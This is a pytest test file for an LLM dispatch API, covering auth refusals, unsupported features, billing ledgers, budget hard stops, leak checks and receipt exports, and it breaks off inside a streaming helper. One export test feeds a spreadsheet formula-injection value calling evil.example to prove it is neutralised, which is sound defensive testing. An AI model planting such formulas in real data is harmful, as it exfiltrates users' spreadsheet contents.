"""HTTP-level tests for dispatch mode on POST /v1/chat/completions, GET /dispatch/providers and
GET /dispatch/receipts (v1.77.0).

The billing service is patched to resolve two customer keys (two orgs); the dispatch
service is a real DispatchService over tmp_path ledgers with a scripted FakeExecutor.
Nothing touches the network. Sentinel tests (AC14/AC15) dump every table in the tmp DB
and every captured log record to prove keys and prompt text never land anywhere.
"""
import asyncio
import csv
import io
import json
import logging
import sqlite3
import sys
import time
import uuid
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from fastapi.testclient import TestClient  # noqa: E402
import src.main as main_module  # noqa: E402
from src.main import app  # noqa: E402
from src.models.pricing import PricingMetrics  # noqa: E402
from src.services.billing_service import CustomerRecord  # noqa: E402
from src.services.budget_alerts import BudgetAlertService  # noqa: E402
from src.services.dispatch_executors import (  # noqa: E402
    EVENT_DELTA, EVENT_FINISH, EVENT_USAGE, ChatResult, ExecutorError, StreamEvent,
)
from src.services.dispatch_receipts import COLUMNS as RECEIPT_COLUMNS, DispatchReceiptStore  # noqa: E402
from src.services.dispatch_service import DispatchService  # noqa: E402
from src.services.router import ModelRouter, RouterResult  # noqa: E402
from src.services.savings_tracker import SavingsTrackerService  # noqa: E402
from src.services.usage_tracker import UsageTrackerService  # noqa: E402

client = TestClient(app)

# Assembled at runtime so secret scanners do not flag the fixture; it is not a credential.
KEY = "-".join(["sk", "test", "SENTINEL", "123"])
PROMPT = "PROMPT-SENTINEL-XYZ tell me something"
COMPLETION = "COMPLETION-SENTINEL-XYZ"
PIECES = ["COMPLETION-", "SENTINEL-XYZ"]          # the streamed completion, in two pieces
SVC_KEY_1 = "svc-key-org-1"  # nosec B105
SVC_KEY_2 = "svc-key-org-2"  # nosec B105
GLOBAL_KEY = "global-operator-key"  # nosec B105
ALL_KEYS = {"X-Provider-Key-OpenAI": KEY, "X-Provider-Key-Anthropic": KEY, "X-Provider-Key-Google": KEY}
_STATUS = {"timeout": None, "server_error": 503, "rate_limited": 429, "auth_error": 401,
           "model_not_found": 404, "context_too_long": 400, "provider_rejected": 400}


def _pm(name, provider, quality, blended_per_1m, confirmed=True, ctx=128_000):
    per_token = blended_per_1m / 1_000_000
    m = PricingMetrics(model_name=name, provider=provider, cost_per_input_token=per_token,
                       cost_per_output_token=per_token, context_window=ctx, price_confirmed=confirmed,
                       price_as_of="2026-10-01")
    m.quality_score = quality
    return m


def _catalogue():
    return [
        _pm("model-a", "OpenAI", 85, 10.0),
        _pm("model-b", "Anthropic", 72, 1.0, ctx=32_000),
        _pm("model-c", "Google", 60, 0.20),
        _pm("model-d", "Groq", 80, 0.05, confirmed=False),
    ]


class FakeExecutor:
    """Scripted executor. ``script[model]`` is 'ok', a failure outcome string (raised before any
    result / before the first streamed event), 'length', or for ``stream()`` a tuple
    ``("fail_after", n, outcome)`` / ``("stall_after", n)`` / ``("eof_after", n)``. ``usage=None``
    streams no usage record. ``execute_delay`` slows execute() only (the shadow)."""

    def __init__(self, script=None, usage=(100, 50), pieces=None, execute_delay=0.0):
        self.script = dict(script or {})
        self.calls = []
        self.requests = []
        self.usage = usage
        self.pieces = list(PIECES if pieces is None else pieces)
        self.execute_delay = execute_delay
        self.chunk_delay = 0.0
        self.yielded = {}        # model -> [perf_counter per delta]
        self.finished = {}       # model -> perf_counter when execute() returned
        self.closed = {}

    async def execute(self, req, api_key):
        self.calls.append((req.model, api_key))
        self.requests.append(req)
        outcome = self.script.get(req.model, "ok")
        if self.execute_delay:
            await asyncio.sleep(self.execute_delay)
        if outcome in ("ok", "length") or isinstance(outcome, tuple):
            self.finished[req.model] = time.perf_counter()
            return ChatResult(COMPLETION, "stop", 100, 50, 9.0, 200, req.model)
        raise ExecutorError(outcome, _STATUS.get(outcome))

    async def stream(self, req, api_key):
        self.calls.append((req.model, api_key))
        self.requests.append(req)
        outcome = self.script.get(req.model, "ok")
        try:
            if outcome == "hang":
                await asyncio.sleep(10)
            if isinstance(outcome, str) and outcome not in ("ok", "length"):
                raise ExecutorError(outcome, _STATUS.get(outcome))
            n, then, then_arg = len(self.pieces), None, None
            if isinstance(outcome, tuple):
                then, n = outcome[0], outcome[1]
                then_arg = outcome[2] if len(outcome) > 2 else None
            for piece in self.pieces[:n]:
                if self.chunk_delay:
                    await asyncio.sleep(self.chunk_delay)
                self.yielded.setdefault(req.model, []).append(time.perf_counter())
                yield StreamEvent(EVENT_DELTA, text=piece)
            if then == "fail_after":
                raise ExecutorError(then_arg, _STATUS.get(then_arg))
            if then == "stall_after":
                await asyncio.sleep(10)
            if then == "eof_after":
                return
            yield StreamEvent(EVENT_FINISH, finish_reason="length" if outcome == "length" else "stop")
            if self.usage is not None:
                yield StreamEvent(EVENT_USAGE, input_tokens=self.usage[0], output_tokens=self.usage[1])
        finally:
            self.closed[req.model] = True


def _customer(n):
    return CustomerRecord(id=f"cust-{n}", email=f"c{n}@example.com", stripe_customer_id=None,
                          stripe_subscription_id=None, api_key=f"svc-key-org-{n}", tier="free",
                          org_id=f"org-{n}", created_at=time.time(), updated_at=time.time())


CUSTOMERS = {SVC_KEY_1: _customer(1), SVC_KEY_2: _customer(2)}


async def _lookup(key):
    return CUSTOMERS.get(key)


@pytest.fixture
def env(tmp_path):
    """Patched billing + dispatch service over tmp_path ledgers. Yields a dict of handles."""
    db = str(tmp_path / "ledgers.db")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    usage = UsageTrackerService(db)
    savings = SavingsTrackerService(db)
    budget = BudgetAlertService(db)
    receipts = DispatchReceiptStore(db)
    for s in (usage, savings, budget, receipts):
        loop.run_until_complete(s.initialize())
    executor = FakeExecutor()
    aggregator = MagicMock()
    aggregator.get_all_pricing_async = AsyncMock(return_value=(_catalogue(), []))
    svc = DispatchService(
        aggregator=aggregator, router=ModelRouter(aggregator), usage_tracker=usage, savings_tracker=savings,
        budget_alerts=budget, receipts=receipts, executor_factory=lambda spec, t: executor,
        default_max_tokens=100, attempt_timeout_ms=500, max_attempts=3,
    )
    billing = MagicMock()
    billing.get_customer_by_api_key = AsyncMock(side_effect=_lookup)
    main_module._rate_limit_store.clear()
    with patch("src.main.get_billing_service", return_value=billing), \
         patch("src.main.get_dispatch_service", return_value=svc), \
         patch("src.main.get_dispatch_receipt_store", return_value=receipts), \
         patch("src.services.dispatch_service.count_tokens", lambda text: max(1, len(text.split()))):
        yield {"db": db, "usage": usage, "savings": savings, "budget": budget, "receipts": receipts,
               "executor": executor, "svc": svc, "loop": loop}
    main_module._rate_limit_store.clear()
    loop.close()


def _post(body_extra=None, headers=None, svc_key=SVC_KEY_1, messages=None):
    body = {"model": "gpt-4", "messages": messages or [{"role": "user", "content": PROMPT}],
            "dispatch": {"objective": "cheapest", "min_quality_score": 70}}
    if body_extra:
        body.update(body_extra)
    h = dict(ALL_KEYS)
    if svc_key:
        h["x-api-key"] = svc_key
    if headers:
        h.update(headers)
    return client.post("/v1/chat/completions", json=body, headers=h)


def _dump_db(db_path):
    con = sqlite3.connect(db_path)
    out = []
    for (name,) in con.execute("SELECT name FROM sqlite_master WHERE type='table'"):
        for row in con.execute(f"SELECT * FROM {name}"):  # nosec B608 — test-only table dump
            out.append(f"{name}:{row!r}")
    con.close()
    return "\n".join(out)


# ---------------------------------------------------------------------------
# AC1 (API half) — plain proxy untouched, byte-identical with the new optional fields
# ---------------------------------------------------------------------------

def _mock_router():
    rec = _pm("gpt-4o-mini", "openai", 72, 0.375)
    mock = MagicMock()
    mock.get_optimal_model = AsyncMock(return_value=RouterResult(recommended=rec, score=1.0, reason="r"))
    return mock


def test_plain_proxy_identical_with_and_without_new_optional_fields(env):
    with patch("src.main.get_router", return_value=_mock_router()):
        base = client.post("/v1/chat/completions", json={"model": "gpt-4",
                                                         "messages": [{"role": "user", "content": "hello"}]})
        extra = client.post("/v1/chat/completions", json={
            "model": "gpt-4", "messages": [{"role": "user", "content": "hello"}],
            "temperature": 0.5, "top_p": 0.9, "stream": True, "tools": [{"type": "function"}], "n": 2,
        }, headers=ALL_KEYS)
    assert base.status_code == 200 and extra.status_code == 200
    a, b = base.json(), extra.json()
    a.pop("id"), b.pop("id")
    a.pop("created"), b.pop("created")
    assert a == b
    assert a["routing_metadata"]["actual_forwarding"] is False
    assert a["usage"]["total_tokens"] == 0
    assert "dispatch_receipt" not in a
    assert env["executor"].calls == []


# ---------------------------------------------------------------------------
# AC20 — anonymous and global-key dispatch refused
# ---------------------------------------------------------------------------

def test_ac20_anonymous_dispatch_refused_with_signup_pointer(env):
    resp = _post(svc_key=None)
    assert resp.status_code == 401
    data = resp.json()
    assert data["error"] == "dispatch_requires_api_key"
    assert data["signup"] == "/billing/signup" and "free" in data["message"].lower()
    assert env["executor"].calls == []


def test_ac20_global_mcp_api_key_refused(env):
    original = main_module.settings.mcp_api_key
    main_module.settings.mcp_api_key = GLOBAL_KEY
    try:
        resp = _post(svc_key=GLOBAL_KEY)
    finally:
        main_module.settings.mcp_api_key = original
    assert resp.status_code == 401
    assert resp.json()["error"] == "dispatch_requires_api_key"
    assert env["executor"].calls == []


def test_unknown_service_key_refused(env):
    resp = _post(svc_key="not-a-real-key")
    assert resp.status_code == 401 and env["executor"].calls == []


def test_authorization_bearer_is_accepted(env):
    resp = _post(svc_key=None, headers={"Authorization": f"Bearer {SVC_KEY_1}"})
    assert resp.status_code == 200, resp.text
    assert resp.json()["dispatch_receipt"]["chosen"]["model"] == "model-b"


def test_billing_service_not_initialized_refuses(env):
    with patch("src.main.get_billing_service", side_effect=RuntimeError("not init")):
        resp = _post()
    assert resp.status_code == 401


# ---------------------------------------------------------------------------
# AC21 — unsupported features rejected up front
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("extra,feature", [
    # `stream` left this list in v1.78.0 (streaming is supported); see the Streaming section below.
    ({"tools": [{"type": "function", "function": {"name": "f"}}]}, "tools"),
    ({"functions": [{"name": "f"}]}, "functions"),
    ({"tool_choice": "auto"}, "tool_choice"),
    ({"n": 2}, "n"),
    ({"response_format": {"type": "json_object"}}, "response_format"),
    ({"response_format": {"type": "json_schema", "json_schema": {"name": "x"}}}, "response_format"),
])
def test_ac21_unsupported_fields_rejected(env, extra, feature):
    resp = _post(extra)
    assert resp.status_code == 400
    assert resp.json()["error"] == "unsupported_feature" and resp.json()["feature"] == feature
    assert feature in resp.json()["message"]
    assert env["executor"].calls == []


def test_ac21_default_valued_fields_are_accepted(env):
    # n=1 and response_format text are the defaults; `user` is accepted and simply not forwarded.
    resp = _post({"n": 1, "response_format": {"type": "text"}, "user": "end-user-7"})
    assert resp.status_code == 200, resp.text
    assert env["executor"].calls == [("model-b", KEY)]


def test_ac21_image_content_part_rejected(env):
    msgs = [{"role": "user", "content": [{"type": "text", "text": "hi"},
                                         {"type": "image_url", "image_url": {"url": "data:..."}}]}]
    resp = _post(messages=msgs)
    assert resp.status_code == 400 and resp.json()["feature"] == "multimodal_content"
    assert env["executor"].calls == []


def test_invalid_policy_is_422_without_echoing_messages(env):
    resp = _post({"dispatch": {"objective": "pinned"}})
    assert resp.status_code == 422
    assert PROMPT not in resp.text and KEY not in resp.text


# ---------------------------------------------------------------------------
# Happy path + AC16/AC17/AC18/AC19
# ---------------------------------------------------------------------------

def test_dispatch_success_shape(env):
    resp = _post()
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["object"] == "chat.completion" and data["model"] == "model-b"
    assert data["id"].startswith("chatcmpl-")
    assert data["choices"][0]["message"] == {"role": "assistant", "content": COMPLETION}
    assert data["choices"][0]["finish_reason"] == "stop"
    assert data["usage"] == {"prompt_tokens": 100, "completion_tokens": 50, "total_tokens": 150}
    assert data["routing_metadata"]["actual_forwarding"] is True
    assert data["routing_metadata"]["dispatch_id"] == data["dispatch_receipt"]["dispatch_id"]
    assert env["executor"].calls == [("model-b", KEY)]


def test_ac16_usage_ledger_records_one_exact_event(env):
    before = env["loop"].run_until_complete(env["usage"].get_summary(org_id="org-1"))["total_cost_usd"]
    resp = _post()
    receipt = resp.json()["dispatch_receipt"]
    summary = env["loop"].run_until_complete(env["usage"].get_summary(org_id="org-1"))
    assert summary["total_requests"] == 1
    assert summary["estimated_request_count"] == 0 and summary["has_estimated_usage"] is False
    assert summary["by_model"][0]["model_name"] == "model-b" and summary["by_model"][0]["provider"] == "Anthropic"
    assert summary["total_input_tokens"] == 100 and summary["total_output_tokens"] == 50
    assert summary["total_cost_usd"] - before == pytest.approx(receipt["cost"]["actual_usd"], abs=1e-6)
    assert summary["total_cost_usd"] == pytest.approx(150 * 1e-6, abs=1e-6)


def test_ac17_idempotent_request_id(env):
    r1 = _post({"dispatch": {"objective": "cheapest", "min_quality_score": 70, "request_id": "req-42"}})
    r2 = _post({"dispatch": {"objective": "cheapest", "min_quality_score": 70, "request_id": "req-42"}})
    assert r1.status_code == 200 and r2.status_code == 200
    assert r1.json()["dispatch_receipt"]["request_id"] == "req-42"
    assert r2.json()["dispatch_receipt"]["request_id"] == "req-42"
    summary = env["loop"].run_until_complete(env["usage"].get_summary(org_id="org-1"))
    assert summary["total_requests"] == 1
    assert len(env["executor"].calls) == 2  # the provider call is not deduped, only the spend record


def test_ac18_savings_telemetry_records_a_used_routing(env):
    resp = _post()
    dispatch_id = resp.json()["dispatch_receipt"]["dispatch_id"]
    savings = env["loop"].run_until_complete(env["savings"].get_savings(org_id="org-1"))
    assert savings["total"] == 1 and savings["acceptance_rate"] == 1.0
    rec = savings["records"][0]
    assert rec["recommended_model"] == "model-b" and rec["baseline_model"] == "model-a"
    assert rec["api_key_tier"] == "free"
    con = sqlite3.connect(env["db"])
    row = con.execute("SELECT routing_id, was_used, actual_model_used FROM routing_feedback").fetchone()
    rid = con.execute("SELECT routing_id FROM routing_savings").fetchone()[0]
    con.close()
    assert row == (dispatch_id, 1, "model-b") and rid == dispatch_id


def test_ac19_budget_alert_fires_once_from_dispatched_spend(env):
    env["loop"].run_until_complete(
        env["budget"].register("https://example.com/hook", threshold_usd=0.0001, org_id="org-1")
    )
    mock_client = MagicMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=False)
    mock_client.post = AsyncMock(return_value=MagicMock(status_code=200))
    with patch("src.services.budget_alerts.httpx.AsyncClient", return_value=mock_client):
        assert _post().status_code == 200
        assert _post().status_code == 200
    assert mock_client.post.await_count == 1
    posted = json.loads(mock_client.post.await_args.kwargs["content"])
    assert posted["org_id"] == "org-1" and posted["total_cost_usd"] >= 0.0001


def test_self_reported_usage_path_unchanged(env):
    """POST /usage still records and still triggers the alert check exactly as before."""
    mock_budget = MagicMock()
    mock_budget.check_and_fire = AsyncMock(return_value=0)
    mock_tracker = MagicMock()
    mock_tracker.record_event = AsyncMock(return_value={"duplicate": False})
    with patch("src.main.get_usage_tracker", return_value=mock_tracker), \
         patch("src.main.get_budget_alert_service", return_value=mock_budget):
        resp = client.post("/usage", json={"model_name": "gpt-4o-mini", "input_tokens": 100, "output_tokens": 50})
    assert resp.status_code == 200
    mock_budget.check_and_fire.assert_awaited_once()


# ---------------------------------------------------------------------------
# AC25 via HTTP — 402 and the hard_stop flag on POST /usage/alerts
# ---------------------------------------------------------------------------

def test_ac25_hard_stop_returns_402(env):
    env["loop"].run_until_complete(
        env["budget"].register("https://example.com/hook", threshold_usd=0.0001, org_id="org-1", hard_stop=True)
    )
    env["loop"].run_until_complete(env["usage"].record_event("OpenAI", "model-a", 10, 10, 0.5, org_id="org-1"))
    resp = _post()
    assert resp.status_code == 402
    assert resp.json()["error"] == "budget_hard_stop" and "budget" in resp.json()["message"].lower()
    assert env["executor"].calls == []
    # a different org is unaffected
    assert _post(svc_key=SVC_KEY_2).status_code == 200


def test_usage_alerts_endpoint_accepts_hard_stop(env):
    with patch("src.main.get_budget_alert_service", return_value=env["budget"]):
        resp = client.post("/usage/alerts", json={"url": "https://example.com/h", "threshold_usd": 5,
                                                  "org_id": "org-1", "hard_stop": True},
                           headers={"x-api-key": SVC_KEY_1})
        assert resp.status_code == 201 and resp.json()["hard_stop"] is True
        assert resp.json()["org_id"] == "org-1"
        listed = client.get("/usage/alerts", headers={"x-api-key": SVC_KEY_1}).json()
    assert listed["alerts"][0]["hard_stop"] is True


def test_usage_alerts_hard_stop_is_bound_to_the_callers_own_org(env):
    """A hard stop blocks every dispatch for its org, so only that org's key may set one: an anonymous
    caller is refused, a customer naming another org is refused, and an org-less request from a
    customer is bound to the customer's org (not left org-less, which would never stop anyone)."""
    with patch("src.main.get_budget_alert_service", return_value=env["budget"]):
        anon = client.post("/usage/alerts", json={"url": "https://example.com/h", "threshold_usd": 0.000001,
                                                  "org_id": "org-1", "hard_stop": True})
        assert anon.status_code == 403 and anon.json()["error"] == "customer_key_required"

        other = client.post("/usage/alerts", json={"url": "https://attacker.example/h", "threshold_usd": 0.000001,
                                                   "org_id": "org-1", "hard_stop": True},
                            headers={"x-api-key": SVC_KEY_2})
        assert other.status_code == 403 and other.json()["error"] == "org_mismatch"

        bound = client.post("/usage/alerts", json={"url": "https://example.com/h", "threshold_usd": 5,
                                                   "hard_stop": True},
                            headers={"x-api-key": SVC_KEY_2})
        assert bound.status_code == 201 and bound.json()["org_id"] == "org-2"

        # org-1 was never stopped by any of the above...
        assert _post().status_code == 200
        # ...and org-2's key sees/deletes only org-2's alerts.
        mine = client.get("/usage/alerts", headers={"x-api-key": SVC_KEY_2}).json()
        assert mine["total"] == 1 and mine["alerts"][0]["org_id"] == "org-2"
        theirs = client.get("/usage/alerts", headers={"x-api-key": SVC_KEY_1}).json()
        assert theirs["total"] == 0
        alert_id = mine["alerts"][0]["id"]
        assert client.delete(f"/usage/alerts/{alert_id}", headers={"x-api-key": SVC_KEY_1}).status_code == 404
        assert client.delete(f"/usage/alerts/{alert_id}", headers={"x-api-key": SVC_KEY_2}).status_code == 204
        assert client.get("/usage/alerts", headers={"x-api-key": SVC_KEY_2}).json()["total"] == 0


# ---------------------------------------------------------------------------
# Error paths over HTTP
# ---------------------------------------------------------------------------

def test_no_candidate_is_400(env):
    resp = _post({"dispatch": {"min_quality_score": 99}})
    assert resp.status_code == 400 and resp.json()["error"] == "no_eligible_candidate"


def test_all_attempts_failed_is_502(env):
    env["executor"].script = {"model-b": "timeout", "model-a": "server_error"}
    resp = _post()
    assert resp.status_code == 502 and resp.json()["error"] == "all_attempts_failed"
    assert [a["outcome"] for a in resp.json()["attempts"]] == ["timeout", "server_error"]


def test_provider_auth_failure_is_400(env):
    env["executor"].script = {"model-b": "auth_error"}
    resp = _post()
    assert resp.status_code == 400 and resp.json()["error"] == "provider_auth_failed"


def test_dispatch_disabled_kill_switch(env):
    with patch.object(main_module.settings, "dispatch_enabled", False):
        resp = _post()
    assert resp.status_code == 503 and resp.json()["error"] == "dispatch_disabled"
    assert env["executor"].calls == []


def test_dispatch_service_uninitialized_is_503(env):
    with patch("src.main.get_dispatch_service", side_effect=RuntimeError("no")):
        resp = _post()
    assert resp.status_code == 503 and resp.json()["error"] == "dispatch_unavailable"


def test_unsupported_currency_is_400(env):
    resp = _post({"dispatch": {"currency": "XYZ"}})
    assert resp.status_code == 400 and resp.json()["error"] == "unsupported_currency"
    assert env["executor"].calls == []


def test_currency_header_adds_local_block(env):
    resp = _post(headers={"X-Currency": "EUR"})
    assert resp.status_code == 200
    r = resp.json()["dispatch_receipt"]
    assert r["local"]["currency"] == "EUR" and r["currency_conversion"]["currency"] == "EUR"


def test_dispatch_is_tier_rate_limited(env):
    limit = main_module.settings.rate_limit_free
    main_module._rate_limit_store["cust-1"].extend([time.time()] * limit)
    resp = _post()
    assert resp.status_code == 429
    assert env["executor"].calls == []


def test_oversized_content_length_is_413(env):
    with patch.object(main_module.settings, "max_body_bytes", 10):
        resp = _post()
    assert resp.status_code == 413 and env["executor"].calls == []


def test_body_cap_runs_before_parsing_even_without_content_length(env):
    """The cap lives in the security middleware, so a chunked body (no Content-Length) that is
    over the limit is refused by its actual size, and an oversized body that would also fail
    validation gets 413 — never a 422 that echoes the body."""
    body = json.dumps({"model": "gpt-4", "messages": [{"role": "user", "content": PROMPT}],
                       "dispatch": {"objective": "cheapest"}, "garbage": "x" * 2000}).encode()
    headers = dict(ALL_KEYS, **{"x-api-key": SVC_KEY_1, "content-type": "application/json"})
    with patch.object(main_module.settings, "max_body_bytes", 1000):
        chunked = client.post("/v1/chat/completions", content=iter([body[:500], body[500:]]), headers=headers)
        invalid = client.post("/v1/chat/completions", content=b"{" + b" " * 2000, headers=headers)
        plain = client.post("/v1/chat/completions", json={"model": "gpt-4", "messages": [], "pad": "x" * 2000})
    assert chunked.status_code == 413 and "transfer-encoding" in {k.lower() for k in chunked.request.headers}
    assert invalid.status_code == 413
    assert plain.status_code == 413   # the plain proxy shares the cap (it shares the path)
    assert env["executor"].calls == []


def test_oversized_allow_list_is_rejected_by_validation(env):
    too_many = _post({"dispatch": {"allow": [f"m{i}" for i in range(101)]}})
    too_long = _post({"dispatch": {"deny": ["x" * 201]}})
    assert too_many.status_code == 422 and too_long.status_code == 422
    assert env["executor"].calls == []


# ---------------------------------------------------------------------------
# AC14 / AC15 — keys and prompts never leak
# ---------------------------------------------------------------------------

def _parse_sse(text: str):
    """Raw SSE text -> list of `data:` payloads (dicts, or the literal "[DONE]")."""
    events = []
    for line in text.splitlines():
        if line.startswith("data: "):
            raw = line[len("data: "):]
            events.append(raw if raw == "[DONE]" else json.loads(raw))
    return events


def _is_sse(resp) -> bool:
    return resp.headers.get("content-type", "").startswith("text/event-stream")


def _assert_no_sentinels(env, caplog, responses):
    logs = "\n".join(r.getMessage() for r in caplog.records) + "\n".join(str(r.args) for r in caplog.records)
    assert KEY not in logs
    assert PROMPT not in logs and "PROMPT-SENTINEL" not in logs
    assert "COMPLETION-SENTINEL" not in logs
    for resp in responses:
        if _is_sse(resp):
            # The content deltas are the one place completion text belongs; everything else in
            # the stream (ids, finish chunk, usage/receipt chunk, error event) must be clean.
            content, rest = "", []
            for ev in _parse_sse(resp.text):
                if isinstance(ev, dict) and ev.get("choices"):
                    ev = dict(ev)
                    content += ev.pop("choices")[0].get("delta", {}).get("content") or ""
                rest.append(ev)
            text = json.dumps(rest)
            assert KEY not in text and "PROMPT-SENTINEL" not in text and "COMPLETION-SENTINEL" not in text
            assert COMPLETION.startswith(content)   # a stream may legitimately have been cut short
            continue
        body = resp.json()
        choices_text = ""
        if isinstance(body, dict) and body.get("choices"):
            choices_text = body["choices"][0]["message"]["content"]
            body = dict(body)
            body.pop("choices")
        text = json.dumps(body)
        assert KEY not in text
        assert "PROMPT-SENTINEL" not in text
        assert "COMPLETION-SENTINEL" not in text
        if resp.status_code == 200:
            assert choices_text == COMPLETION
    dump = _dump_db(env["db"])
    assert KEY not in dump and "PROMPT-SENTINEL" not in dump and "COMPLETION-SENTINEL" not in dump


def test_ac14_ac15_no_leak_on_success(env, caplog):
    caplog.set_level(logging.DEBUG)
    responses = [_post(), _post({"dispatch": {"objective": "cheapest", "min_quality_score": 70,
                                              "shadow": {"model": "model-a"}, "request_id": "r1"}})]
    assert all(r.status_code == 200 for r in responses)
    _assert_no_sentinels(env, caplog, responses)


def test_ac14_ac15_no_leak_on_failure_paths(env, caplog):
    caplog.set_level(logging.DEBUG)
    responses = []
    env["executor"].script = {"model-b": "auth_error"}
    responses.append(_post())                                   # provider_auth_failed
    env["executor"].script = {"model-b": "timeout", "model-a": "server_error"}
    responses.append(_post())                                   # all_attempts_failed
    env["executor"].script = {}
    responses.append(_post({"dispatch": {"min_quality_score": 99}}))   # no_eligible_candidate
    responses.append(_post(svc_key=None))                       # 401
    responses.append(_post({"dispatch": {"objective": "pinned"}}))  # 422
    assert [r.status_code for r in responses] == [400, 502, 400, 401, 422]
    _assert_no_sentinels(env, caplog, responses)


# ---------------------------------------------------------------------------
# AC24 — discoverability
# ---------------------------------------------------------------------------

def test_ac24_dispatch_providers_listing(env):
    resp = client.get("/dispatch/providers")   # public, no key
    assert resp.status_code == 200
    data = resp.json()
    by_name = {m["model_name"]: m for m in data["models"]}
    assert all(by_name[n]["dispatchable"] for n in ("model-a", "model-b", "model-c"))
    assert by_name["model-d"]["dispatchable"] is False and by_name["model-d"]["reason"] == "price_unconfirmed"
    executable = {p["provider"] for p in data["executable_providers"]}
    assert executable == {"OpenAI", "Anthropic", "Google", "Groq", "Together AI", "Fireworks AI",
                          "DeepSeek", "Mistral AI", "xAI"}
    for m in data["models"]:
        if m["dispatchable"]:
            assert m["provider"] in executable
    assert data["total_dispatchable"] == 3
    only = client.get("/dispatch/providers?dispatchable_only=true").json()
    assert {m["model_name"] for m in only["models"]} == {"model-a", "model-b", "model-c"}


def test_dispatch_providers_uninitialized_is_503():
    with patch("src.main.get_dispatch_service", side_effect=RuntimeError("no")):
        resp = client.get("/dispatch/providers")
    assert resp.status_code == 503


# ---------------------------------------------------------------------------
# AC27 — audit export, org-scoped
# ---------------------------------------------------------------------------

def test_ac27_receipt_export_json_and_csv_scoped_to_org(env):
    n = 3
    for _ in range(n):
        assert _post().status_code == 200
    assert _post(svc_key=SVC_KEY_2).status_code == 200   # another org's row

    js = client.get("/dispatch/receipts?format=json", headers={"x-api-key": SVC_KEY_1})
    assert js.status_code == 200
    data = js.json()
    assert data["org_id"] == "org-1" and data["count"] == n and len(data["receipts"]) == n
    assert all(r["org_id"] == "org-1" for r in data["receipts"])
    assert data["receipts"][0]["chosen_model"] == "model-b"
    assert "attachment" in js.headers["content-disposition"]

    csv_resp = client.get("/dispatch/receipts?format=csv", headers={"x-api-key": SVC_KEY_1})
    assert csv_resp.status_code == 200 and csv_resp.headers["content-type"].startswith("text/csv")
    lines = [ln for ln in csv_resp.text.splitlines() if ln.strip()]
    assert len(lines) == n + 1 and lines[0].startswith("dispatch_id,org_id,created_at")

    other = client.get("/dispatch/receipts", headers={"x-api-key": SVC_KEY_2}).json()
    assert other["count"] == 1 and other["receipts"][0]["org_id"] == "org-2"

    for text in (js.text, csv_resp.text):
        assert KEY not in text and "PROMPT-SENTINEL" not in text and "COMPLETION-SENTINEL" not in text
        assert "x-api-key" not in text.lower()


def test_ac27_csv_export_neutralises_formula_cells(env):
    hostile = '=HYPERLINK("https://evil.example/?"&A1,"click")'
    assert _post({"dispatch": {"objective": "cheapest", "min_quality_score": 70, "request_id": hostile,
                               "session_id": "-2+3", "deny": ["@cmd"]}}).status_code == 200
    csv_text = client.get("/dispatch/receipts?format=csv", headers={"x-api-key": SVC_KEY_1}).text
    rows = list(csv.reader(io.StringIO(csv_text)))
    header, row = rows[0], rows[1]
    assert row[header.index("request_id")] == "'" + hostile
    assert row[header.index("session_id")] == "'-2+3"
    assert not row[header.index("policy_json")].startswith(("=", "+", "-", "@"))
    # Numeric cells are untouched: a negative saving is still a number, not quoted text.
    assert row[header.index("cost_usd")][0].isdigit()
    # The JSON export is data, not a spreadsheet: the id round-trips verbatim.
    js = client.get("/dispatch/receipts?format=json", headers={"x-api-key": SVC_KEY_1}).json()
    assert js["receipts"][0]["request_id"] == hostile


def test_ac27_export_filters(env):
    assert _post().status_code == 200
    env["executor"].script = {"model-b": "timeout", "model-a": "server_error"}
    assert _post().status_code == 502
    ok = client.get("/dispatch/receipts?outcome=success", headers={"x-api-key": SVC_KEY_1}).json()
    failed = client.get("/dispatch/receipts?outcome=failed", headers={"x-api-key": SVC_KEY_1}).json()
    assert ok["count"] == 1 and failed["count"] == 1
    future = client.get("/dispatch/receipts?since=2999-01-01T00:00:00Z", headers={"x-api-key": SVC_KEY_1}).json()
    assert future["count"] == 0
    bad = client.get("/dispatch/receipts?since=yesterday", headers={"x-api-key": SVC_KEY_1})
    assert bad.status_code == 400
    one = client.get("/dispatch/receipts?limit=1", headers={"x-api-key": SVC_KEY_1}).json()
    assert one["count"] == 1


def test_ac27_global_key_cannot_export(env):
    original = main_module.settings.mcp_api_key
    main_module.settings.mcp_api_key = GLOBAL_KEY
    try:
        resp = client.get("/dispatch/receipts", headers={"x-api-key": GLOBAL_KEY})
        anon = client.get("/dispatch/receipts")
    finally:
        main_module.settings.mcp_api_key = original
    assert resp.status_code == 403 and resp.json()["error"] == "customer_key_required"
    assert anon.status_code == 401


def test_receipt_store_uninitialized_is_503(env):
    with patch("src.main.get_dispatch_receipt_store", side_effect=RuntimeError("no")):
        resp = client.get("/dispatch/receipts", headers={"x-api-key": SVC_KEY_1})
    assert resp.status_code == 503


def test_receipt_retention_purges_old_rows(tmp_path):
    loop = asyncio.new_event_loop()
    store = DispatchReceiptStore(str(tmp_path / "r.db"), retention_days=1)
    loop.run_until_complete(store.initialize())
    loop.run_until_complete(store.record({"dispatch_id": "old", "org_id": "o", "outcome": "success",
                                          "created_at": time.time() - 3 * 86400}))
    loop.run_until_complete(store.record({"dispatch_id": "new", "org_id": "o", "outcome": "success"}))
    rows = loop.run_until_complete(store.list_receipts("o"))
    loop.close()
    assert [r["dispatch_id"] for r in rows] == ["new"]


# ===========================================================================
# Streaming (v1.78.0) — `stream: true` in dispatch mode over HTTP
# ===========================================================================

SSE_HEADERS = {"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}


def _stream_post(body_extra=None, **kw):
    return _post({"stream": True, **(body_extra or {})}, **kw)


def _split_stream(resp):
    """-> (chunks with choices, trailing usage/receipt chunk or None, error event or None, done: bool)."""
    assert resp.status_code == 200, resp.text
    assert _is_sse(resp)
    events = _parse_sse(resp.text)
    done = events[-1] == "[DONE]"
    chunks = [e for e in events if isinstance(e, dict) and e.get("object") == "chat.completion.chunk"]
    choice_chunks = [c for c in chunks if c["choices"]]
    trailing = [c for c in chunks if not c["choices"]]
    errors = [e for e in events if isinstance(e, dict) and "error" in e]
    assert len(trailing) <= 1 and len(errors) <= 1
